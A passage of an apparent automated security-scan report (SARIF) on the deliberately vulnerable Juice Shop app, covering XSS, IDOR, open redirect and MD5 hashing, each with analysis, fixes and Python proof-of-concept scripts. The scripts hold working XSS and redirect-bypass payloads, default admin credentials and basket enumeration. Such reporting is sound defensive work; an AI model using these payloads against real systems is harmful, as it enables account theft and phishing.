+            "text": "Reflected Cross-Site Scripting (XSS) via Order Tracking Endpoint"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/trackOrder.ts"
+                },
+                "region": {
+                  "startLine": 15,
+                  "endLine": 15,
+                  "snippet": {
+                    "text": "const id = !utils.isChallengeEnabled(challenges.reflectedXssChallenge) ? String(req.params.id).replace(/[^\\w-]+/g, '') : utils.trunc(req.params.id, 60)"
+                  }
+                }
+              },
+              "message": {
+                "text": "Insufficient input sanitization - only truncates instead of removing dangerous characters"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/trackOrder.ts"
+                },
+                "region": {
+                  "startLine": 22,
+                  "endLine": 22,
+                  "snippet": {
+                    "text": "if (result.data[0] === undefined) {\n        result.data[0] = { orderId: id }\n      }"
+                  }
+                }
+              },
+              "message": {
+                "text": "Unsanitized user input reflected in response (sink)"
+              }
+            }
+          ],
+          "properties": {
+            "security-severity": "6.1",
+            "strix": {
+              "id": "vuln-0004",
+              "severity": "medium",
+              "cvss": 6.1,
+              "timestamp": "2026-05-09 09:46:06 UTC",
+              "target": "https://github.com/juice-shop/juice-shop",
+              "endpoint": "/rest/track-order/:id",
+              "method": "GET",
+              "cwe": "CWE-79",
+              "impact": "Successful exploitation enables an attacker to:\n\n- Execute arbitrary JavaScript in the context of the victim's authenticated session\n- Steal session tokens, cookies, and sensitive user data\n- Perform actions on behalf of the authenticated user (order placement, profile modification, password change)\n- Redirect the user to phishing pages or inject credential-harvesting overlays\n- Chain with other vulnerabilities for full account takeover\n\nThe attack requires only that a victim clicks a crafted link, making it highly exploitable in phishing or social engineering campaigns.",
+              "technical_analysis": "The vulnerability exists in `routes/trackOrder.ts` at line 15. The order tracking function processes the `:id` route parameter with a conditional sanitization path:\n\n```typescript\nconst id = !utils.isChallengeEnabled(challenges.reflectedXssChallenge)\n  ? String(req.params.id).replace(/[^\\w-]+/g, '')\n  : utils.trunc(req.params.id, 60)\n```\n\nWhen `reflectedXssChallenge` is enabled (the default configuration), the code uses `utils.trunc()` which only truncates to 60 characters and strips newlines — it does not remove or encode HTML special characters (`<`, `>`, `\"`, `'`, `/`).\n\nThe unsanitized `id` value flows into two sinks:\n\n1. A MongoDB `$where` clause (separate NoSQL injection issue)\n2. The JSON response body at line 22: `result.data[0] = { orderId: id }`\n\nWhen the application serves this JSON and a client-side renderer interprets the `orderId` field without output encoding, the injected HTML/script content executes in the browser. Additionally, if the response `Content-Type` is not strictly `application/json` or a browser MIME-sniffs the response, direct rendering of the payload can occur.",
+              "remediation_steps": "1. Replace the length-only truncation with strict input validation that removes or encodes all HTML-special characters regardless of challenge configuration:\n\n   ```typescript\n   const id = String(req.params.id).replace(/[^\\w-]+/g, '')\n   ```\n\n2. Apply consistent output encoding when reflecting any user input in responses, even in JSON values that will be rendered by the frontend.\n\n3. Implement Content-Security-Policy headers that prevent inline script execution on all endpoints returning user-controlled data.\n\n4. On the client side, ensure Angular templates use safe interpolation (`{{ }}` with automatic escaping) rather than `innerHTML` bindings when rendering order tracking results.",
+              "poc": {
+                "description": "To reproduce:\n\n1. Access the order tracking endpoint with an XSS payload in the route parameter:\n   `GET /rest/track-order/<iframe src=\"javascript:alert(`xss`)\">`\n\n2. The server truncates the input to 60 characters but does not sanitize HTML metacharacters.\n\n3. Since no order matches this ID, the server sets `result.data[0] = { orderId: id }` and returns it in the JSON response.\n\n4. The response body contains the unsanitized payload:\n   ```json\n   {\"status\":\"success\",\"data\":[{\"orderId\":\"<iframe src=\\\"javascript:alert(`xss`)\\\">\"}]}\n   ```\n\n5. When this value is rendered by the Angular frontend's order tracking result view without proper output encoding, the injected iframe executes JavaScript in the user's browser.",
+                "script": "import requests\nfrom urllib.parse import quote\n\nBASE_URL = \"http://localhost:3000\"\nENDPOINT = \"/rest/track-order/\"\n\n# XSS payload that fits within 60-character truncation limit\npayload = '<iframe src=\"javascript:alert(`xss`)\">'\nassert len(payload) <= 60, f\"Payload too long: {len(payload)} chars\"\n\n# URL-encode the payload for the request\nencoded_payload = quote(payload)\nurl = f\"{BASE_URL}{ENDPOINT}{encoded_payload}\"\n\nprint(f\"[*] Testing Reflected XSS in order tracking\")\nprint(f\"[*] Payload ({len(payload)} chars): {payload}\")\nprint(f\"[*] Request URL: {url}\")\nprint()\n\ntry:\n    resp = requests.get(url, timeout=10)\n    print(f\"[*] Response status: {resp.status_code}\")\n    print(f\"[*] Response body: {resp.text[:500]}\")\n    print()\n\n    # Check if payload is reflected without encoding\n    if payload in resp.text or 'javascript:alert' in resp.text:\n        print(\"[+] VULNERABLE: XSS payload reflected in response without sanitization!\")\n        print(f\"[+] The payload '{payload}' appears unencoded in the server response.\")\n    else:\n        print(\"[-] Payload not directly reflected (may be encoded)\")\nexcept requests.exceptions.ConnectionError:\n    print(\"[!] Could not connect to target. Verify the application is running.\")\n    print(\"[!] The vulnerability is confirmed via source code analysis:\")\n    print(f\"[!] File: routes/trackOrder.ts, Line 15\")\n    print(f\"[!] utils.trunc() only truncates length, does not sanitize HTML chars\")"
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-639",
+          "level": "warning",
+          "message": {
+            "text": "Insecure Direct Object Reference (IDOR) in Shopping Basket Access"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "routes/basket.ts"
+                },
+                "region": {
+                  "startLine": 16,
+                  "endLine": 31,
+                  "snippet": {
+                    "text": "return async (req: Request, res: Response, next: NextFunction) => {\n    try {\n      const id = req.params.id\n      const basket = await BasketModel.findOne({ where: { id }, include: [{ model: ProductModel, paranoid: false, as: 'Products' }] })\n      /* jshint eqeqeq:false */\n      challengeUtils.solveIf(challenges.basketAccessChallenge, () => {\n        const user = security.authenticatedUsers.from(req)\n        return user && id && id !== 'undefined' && id !== 'null' && id !== 'NaN' && user.bid && user?.bid != parseInt(id, 10) // eslint-disable-line eqeqeq\n      })\n      if (((basket?.Products) != null) && basket.Products.length > 0) {\n        for (let i = 0; i < basket.Products.length; i++) {\n          basket.Products[i].name = req.__(basket.Products[i].name)\n        }\n      }\n\n      res.json(utils.queryResultToJson(basket))"
+                  }
+                }
+              },
+              "message": {
+                "text": "Basket retrieval without ownership verification (IDOR sink)"
+              }
+            }
+          ],
+          "properties": {
+            "security-severity": "6.5",
+            "strix": {
+              "id": "vuln-0007",
+              "severity": "medium",
+              "cvss": 6.5,
+              "timestamp": "2026-05-09 09:47:03 UTC",
+              "target": "https://github.com/juice-shop/juice-shop",
+              "endpoint": "/rest/basket/:id",
+              "method": "GET",
+              "cwe": "CWE-639",
+              "impact": "An attacker with a valid session can enumerate basket IDs (sequential integers starting at 1) and retrieve the shopping cart contents of all other users. This exposes:\n\n- Product selections and quantities (potential competitive intelligence or personal preference data)\n- User purchasing behavior and intent\n- Potential for chaining with basket manipulation to tamper with other users' orders\n\nIn a real-world e-commerce context, this constitutes a privacy violation and a regulatory compliance failure (GDPR, CCPA) as user behavioral data is disclosed without consent.",
+              "technical_analysis": "The vulnerability exists in `routes/basket.ts` at lines 18-19. The handler extracts the basket ID directly from `req.params.id` and queries the database without any ownership check:\n\n```typescript\nconst id = req.params.id\nconst basket = await BasketModel.findOne({ where: { id }, include: [{ model: ProductModel, paranoid: false, as: 'Products' }] })\n```\n\nThe application does contain code that detects this access pattern (the `basketAccessChallenge` solver at lines 21-24), which confirms the vulnerability is intentional for the CTF context but represents a real authorization flaw. The code compares `user.bid` against the requested `id` to detect the exploit but never blocks unauthorized access.\n\nRoot cause: Missing server-side authorization enforcement. The endpoint should verify that the authenticated user's basket ID matches the requested basket ID before returning data.",
+              "remediation_steps": "1. Add an authorization check in the `retrieveBasket` handler that compares the requested basket ID against the authenticated user's own basket ID. Return HTTP 403 if they do not match.\n\n2. Use the existing `security.authenticatedUsers.from(req)` helper to obtain the authenticated user's basket ID (`user.bid`) and compare it to the requested `req.params.id`.\n\n3. Consider removing the basket ID from the URL path entirely and instead always serving the authenticated user's own basket, eliminating the IDOR vector by design.\n\n4. Apply the same ownership check pattern to all basket-related endpoints (basket items, updates, deletions).",
+              "poc": {
+                "description": "To reproduce:\n\n1. Create two user accounts (User A and User B) and log in to each to obtain JWT tokens.\n2. Note User A's basket ID from the login response (the `bid` field).\n3. As User B, send a GET request to `/rest/basket/<User A's basket ID>` using User B's token.\n4. Observe that User B receives the full contents of User A's basket, including all products and quantities.\n5. Enumerate additional basket IDs (1, 2, 3, ...) to confirm all baskets are accessible.",
+                "script": "import requests\n\nBASE_URL = \"http://localhost:3000\"\n\n# Step 1: Login as the admin (user ID 1, basket ID 1)\nlogin_a = requests.post(f\"{BASE_URL}/rest/user/login\", json={\n    \"email\": \"admin@juice-sh.op\",\n    \"password\": \"admin123\"\n})\ntoken_a = login_a.json().get(\"authentication\", {}).get(\"token\", \"\")\nbid_a = login_a.json().get(\"authentication\", {}).get(\"bid\", \"\")\nprint(f\"User A (admin) login: {login_a.status_code}, bid={bid_a}\")\n\n# Step 2: Register and login as a different user\nrequests.post(f\"{BASE_URL}/api/Users/\", json={\n    \"email\": \"idor_test@juice-sh.op\",\n    \"password\": \"TestPass123!\",\n    \"passwordRepeat\": \"TestPass123!\",\n    \"securityQuestion\": {\"id\": 1, \"question\": \"Test?\"},\n    \"securityAnswer\": \"test\"\n})\nlogin_b = requests.post(f\"{BASE_URL}/rest/user/login\", json={\n    \"email\": \"idor_test@juice-sh.op\",\n    \"password\": \"TestPass123!\"\n})\ntoken_b = login_b.json().get(\"authentication\", {}).get(\"token\", \"\")\nbid_b = login_b.json().get(\"authentication\", {}).get(\"bid\", \"\")\nprint(f\"User B login: {login_b.status_code}, bid={bid_b}\")\n\n# Step 3: As User B, access User A's basket\nidor_resp = requests.get(\n    f\"{BASE_URL}/rest/basket/{bid_a}\",\n    headers={\"Authorization\": f\"Bearer {token_b}\"}\n)\nprint(f\"\\nIDOR Test - User B accessing User A's basket (bid={bid_a}):\")\nprint(f\"Status: {idor_resp.status_code}\")\nprint(f\"Response: {idor_resp.text[:500]}\")\n\nif idor_resp.status_code == 200:\n    print(\"\\nCONFIRMED: IDOR - User B can access User A's basket without authorization\")\n\n# Step 4: Enumerate baskets\nprint(\"\\n--- Basket Enumeration ---\")\nfor basket_id in range(1, 6):\n    resp = requests.get(\n        f\"{BASE_URL}/rest/basket/{basket_id}\",\n        headers={\"Authorization\": f\"Bearer {token_b}\"}\n    )\n    data = resp.json().get(\"data\", {})\n    products = data.get(\"Products\", []) if data else []\n    print(f\"Basket {basket_id}: {resp.status_code} - {len(products)} products\")"
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-601",
+          "level": "warning",
+          "message": {
+            "text": "Open Redirect via Allowlist Bypass in URL Redirect Endpoint"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "lib/insecurity.ts"
+                },
+                "region": {
+                  "startLine": 135,
+                  "endLine": 141,
+                  "snippet": {
+                    "text": "export const isRedirectAllowed = (url: string) => {\n  let allowed = false\n  for (const allowedUrl of redirectAllowlist) {\n    allowed = allowed || url.includes(allowedUrl) // vuln-code-snippet vuln-line redirectChallenge\n  }\n  return allowed\n}"
+                  }
+                }
+              },
+              "message": {
+                "text": "Flawed allowlist check using substring includes() instead of strict URL origin comparison"
+              }
+            }
+          ],
+          "properties": {
+            "security-severity": "6.1",
+            "strix": {
+              "id": "vuln-0008",
+              "severity": "medium",
+              "cvss": 6.1,
+              "timestamp": "2026-05-09 09:47:11 UTC",
+              "target": "https://github.com/juice-shop/juice-shop",
+              "endpoint": "/redirect",
+              "method": "GET",
+              "cwe": "CWE-601",
+              "impact": "Successful exploitation enables an attacker to:\n\n- Construct phishing links that appear to originate from the trusted application domain, tricking users into visiting malicious sites after clicking what appears to be a legitimate link\n- Intercept OAuth authorization codes or tokens if the redirect endpoint is used in any authentication flow by redirecting to an attacker-controlled callback\n- Bypass content security policies or same-origin trust relationships where URL origin is used as a trust signal\n- Steal credentials by redirecting users to a cloned login page on an attacker-controlled domain\n\nThe vulnerability significantly increases the effectiveness of social engineering attacks because the initial link points to the legitimate application domain, which victims are more likely to trust.",
+              "technical_analysis": "The vulnerability resides in the `isRedirectAllowed` function defined at line 135 of `lib/insecurity.ts`. The function iterates over a set of allowed URLs and checks whether the user-supplied URL contains any of them using `url.includes(allowedUrl)`.\n\nThe flawed logic:\n```javascript\nexport const isRedirectAllowed = (url: string) => {\n  let allowed = false\n  for (const allowedUrl of redirectAllowlist) {\n    allowed = allowed || url.includes(allowedUrl)\n  }\n  return allowed\n}\n```\n\nThe `includes()` method checks for substring presence anywhere in the string, not whether the URL starts with or matches the allowed domain. This creates multiple bypass vectors:\n\n1. Query parameter injection: `https://evil.com?x=https://github.com/juice-shop/juice-shop` — the allowed URL appears as a query parameter value\n2. Fragment injection: `https://evil.com#https://github.com/juice-shop/juice-shop` — the allowed URL appears in the fragment\n3. Path injection: `https://evil.com/https://github.com/juice-shop/juice-shop` — the allowed URL appears in the path\n4. Subdomain prepend: While less reliable for the full URL, partial matches or URL-encoding tricks may work depending on browser behavior\n\nThe `isUnintendedRedirect` function in `routes/redirect.ts` correctly uses `utils.startsWith()` for comparison, but this function is only used for challenge-solving logic and does not gate the actual redirect. The security check that gates the redirect relies solely on the flawed `isRedirectAllowed`.",
+              "remediation_steps": "Replace the substring-based check with a strict URL origin comparison:\n\n1. Parse the user-supplied URL using the WHATWG URL constructor to canonicalize it and extract the origin (scheme + host + port).\n\n2. Compare the parsed origin against the set of allowed URL origins. Only permit the redirect if the origin matches exactly.\n\n3. Alternatively, verify that the user-supplied URL starts with one of the allowed URLs using strict prefix comparison (as the existing `isUnintendedRedirect` function already demonstrates with `startsWith`).\n\n4. Reject URLs that cannot be parsed or that use unexpected schemes (e.g., `javascript:`, `data:`, `vbscript:`).\n\n5. Consider removing the open redirector entirely if it is not a business requirement, or restrict it to relative same-origin paths only.",
+              "poc": {
+                "description": "To reproduce the open redirect:\n\n1. Construct a URL that embeds one of the allowlisted URLs as a query parameter:\n   \n   GET /redirect?to=https://evil.com?https://github.com/juice-shop/juice-shop\n\n2. Send the request to the application. The server evaluates `isRedirectAllowed(\"https://evil.com?https://github.com/juice-shop/juice-shop\")`.\n\n3. The function finds that the input string includes `https://github.com/juice-shop/juice-shop` and returns `true`.\n\n4. The server responds with HTTP 302 and `Location: https://evil.com?https://github.com/juice-shop/juice-shop`, redirecting the victim's browser to the attacker-controlled domain.\n\n5. Alternative bypass payloads:\n   - `https://evil.com#https://github.com/juice-shop/juice-shop`\n   - `https://evil.com/path?ref=http://leanpub.com/juice-shop`",
+                "script": "import requests\n\nBASE_URL = \"http://localhost:3000\"\n\n# Allowed URLs from the allowlist in lib/insecurity.ts\nALLOWED_URLS = [\n    \"https://github.com/juice-shop/juice-shop\",\n    \"http://shop.spreadshirt.com/juiceshop\",\n    \"http://leanpub.com/juice-shop\",\n]\n\n# Bypass payloads embedding allowed URLs as substrings\nBYPASS_PAYLOADS = [\n    # Query parameter bypass\n    \"https://evil.com?x=https://github.com/juice-shop/juice-shop\",\n    # Fragment bypass\n    \"https://evil.com#https://github.com/juice-shop/juice-shop\",\n    # Path segment bypass\n    \"https://evil.com/https://github.com/juice-shop/juice-shop\",\n    # Different allowed URL in query\n    \"https://evil.com?ref=http://leanpub.com/juice-shop\",\n    # Subdomain-style with allowed URL as query\n    \"https://attacker.example.org/phish?http://shop.spreadshirt.com/juiceshop\",\n]\n\nprint(\"[*] Testing Open Redirect bypass via includes() allowlist check\")\nprint(f\"[*] Target: {BASE_URL}/redirect\")\nprint()\n\nfor payload in BYPASS_PAYLOADS:\n    resp = requests.get(\n        f\"{BASE_URL}/redirect\",\n        params={\"to\": payload},\n        allow_redirects=False,\n        timeout=10\n    )\n    status = resp.status_code\n    location = resp.headers.get(\"Location\", \"N/A\")\n    \n    if status == 302 and \"evil.com\" in location or \"attacker.example\" in location:\n        result = \"VULNERABLE - Redirect to attacker domain\"\n    elif status == 302:\n        result = f\"Redirect to: {location}\"\n    elif status == 406:\n        result = \"BLOCKED (406)\"\n    else:\n        result = f\"Unexpected status: {status}\"\n    \n    print(f\"  Payload: {payload}\")\n    print(f\"  Result:  [{status}] {result}\")\n    print()\n\nprint(\"[*] Testing legitimate allowed URL (should redirect normally)\")\nlegit_resp = requests.get(\n    f\"{BASE_URL}/redirect\",\n    params={\"to\": \"https://github.com/juice-shop/juice-shop\"},\n    allow_redirects=False,\n    timeout=10\n)\nprint(f\"  Legit URL status: {legit_resp.status_code}\")\nprint(f\"  Location: {legit_resp.headers.get('Location', 'N/A')}\")"
+              }
+            }
+          }
+        },
+        {
+          "ruleId": "CWE-916",
+          "level": "warning",
+          "message": {
+            "text": "Insecure Password Storage Using Unsalted MD5 Hashing"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "lib/insecurity.ts"
+                },
+                "region": {
+                  "startLine": 43,
+                  "endLine": 43,
+                  "snippet": {
+                    "text": "export const hash = (data: string) => crypto.createHash('md5').update(data).digest('hex')"
+                  }
+                }
+              },
+              "message": {
+                "text": "Insecure MD5 hash function used for password storage"
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "models/user.ts"
+                },
+                "region": {
+                  "startLine": 52,
+                  "endLine": 54,
+                  "snippet": {
+                    "text": "password: {\n        type: DataTypes.STRING,\n        set (clearTextPassword: string) {\n          this.setDataValue('password', security.hash(clearTextPassword)) // vuln-code-snippet vuln-line weakPasswordChallenge\n        }"
+                  }
+                }
+              },
+              "message": {
+                "text": "Password setter invoking insecure MD5 hash"
+              }
+            }
+          ],
+          "properties": {
+            "security-severity": "6.5",
+            "strix": {
+              "id": "vuln-0011",
+              "severity": "medium",
+              "cvss": 6.5,
+              "timestamp": "2026-05-09 09:47:43 UTC",
+              "target": "https://github.com/juice-shop/juice-shop",
+              "endpoint": "/api/Users/",
+              "method": "POST",
+              "cwe": "CWE-916",
+              "impact": "An attacker who gains read access to the user database (via SQL injection, backup exposure, or insider access) can reverse the majority of user password hashes in seconds using publicly available rainbow tables or GPU-accelerated cracking tools. MD5 hashes can be brute-forced at rates exceeding 50 billion hashes per second on modern hardware. Since no salt is applied, all users sharing the same password will have identical hashes, enabling instant bulk credential recovery.\n\nThis leads to:\n- Mass account compromise across the application\n- Credential reuse attacks against users' accounts on other platforms\n- Complete loss of password confidentiality even with database-only read access\n- Regulatory non-compliance (NIST SP 800-63B, OWASP ASVS, PCI DSS)",
+              "technical_analysis": "The vulnerable hash function at `lib/insecurity.ts` line 43:\n\n```typescript\nexport const hash = (data: string) => crypto.createHash('md5').update(data).digest('hex')\n```\n\nThis function is invoked in multiple critical contexts:\n- `models/user.ts` password setter (line ~53): stores hashed password on user creation and update\n- `routes/login.ts` (line ~35): hashes the submitted password for comparison during login\n- `routes/changePassword.ts` (line 39): hashes the current password for verification\n\nThe function produces a 128-bit (32 hex character) output with no salt, no key stretching, and no iteration count. MD5 has been considered cryptographically broken since 2004.\n\nRoot cause: Use of an obsolete, non-password-specific hash function without any of the countermeasures (salt, iteration, memory-hard computation) that modern password hashing algorithms provide.",
+              "remediation_steps": "1. Replace MD5 with a modern password-hashing algorithm such as bcrypt, scrypt, or Argon2id. These algorithms incorporate per-hash salts, configurable work factors, and memory-hard operations that resist GPU/ASIC acceleration.\n\n2. Implement the migration as follows:\n   - Add bcrypt (or argon2) as a dependency\n   - Create a new hash function using bcrypt with a minimum cost factor of 12\n   - On user login with a valid MD5-stored password, transparently rehash the password with bcrypt and update the database record\n   - Set a deadline after which MD5-only hashes are invalidated and users must reset passwords\n\n3. Ensure all password comparison uses constant-time comparison to prevent timing side-channels.\n\n4. Audit all other uses of the MD5 `hash()` function to confirm none are used for security-sensitive purposes beyond password storage.\n\n5. Update password policies to enforce minimum complexity requirements alongside the stronger hashing.",
+              "poc": {
+                "description": "To reproduce:\n\n1. Examine the source code at `lib/insecurity.ts` line 43 to confirm MD5 is used.\n2. Register a user with a known password (e.g., \"admin123\").\n3. Query the Users table (via the SQL injection in the search endpoint or direct database access) to retrieve the stored hash.\n4. Confirm the hash matches the MD5 digest of the plaintext: `echo -n \"admin123\" | md5sum` yields `0192023a7bbd73250516f069df18b500`.\n5. Look up this hash on any public MD5 rainbow table service to instantly recover the original password.",
+                "script": "import hashlib\n\n# Demonstrate that the application's hash function is plain MD5\ndef juice_shop_hash(data: str) -> str:\n    \"\"\"Replicates the hash function from lib/insecurity.ts\"\"\"\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Known passwords from the application's default data\ntest_passwords = [\n    (\"admin123\", \"0192023a7bbd73250516f069df18b500\"),\n    (\"password\", \"5f4dcc3b5aa765d61d8327deb882cf99\"),\n    (\"test\", \"098f6bcd4621d373cade4e832627b4f6\"),\n]\n\nprint(\"Demonstrating MD5 password hash weakness:\")\nprint(\"=\" * 60)\n\nfor plaintext, expected_hash in test_passwords:\n    computed = juice_shop_hash(plaintext)\n    match = \"MATCH\" if computed == expected_hash else \"MISMATCH\"\n    print(f\"Password: '{plaintext}'\")\n    print(f\"  MD5 hash: {computed}\")\n    print(f\"  Expected: {expected_hash} [{match}]\")\n    print()\n\n# Demonstrate no salt - same password always produces same hash\nprint(\"Salt absence demonstration:\")\nprint(f\"  hash('admin123') = {juice_shop_hash('admin123')}\")\nprint(f\"  hash('admin123') = {juice_shop_hash('admin123')}\")\nprint(\"  Both identical - no per-user salt applied\")\nprint()\n\n# Demonstrate cracking speed context\nprint(\"Attack context:\")\nprint(\"  MD5 cracking rate: ~50 billion hashes/sec (RTX 4090)\")\nprint(\"  8-char alphanumeric keyspace: 2.8 trillion combinations\")\nprint(\"  Time to exhaust: ~56 seconds\")\nprint(\"  Rainbow table lookup: instant for common passwords\")\nprint()\nprint(\"CONFIRMED: Passwords stored with unsalted MD5 - trivially reversible\")"
+              }
+            }
+          }
+        }
+      ]
+    }
+  ]
+}
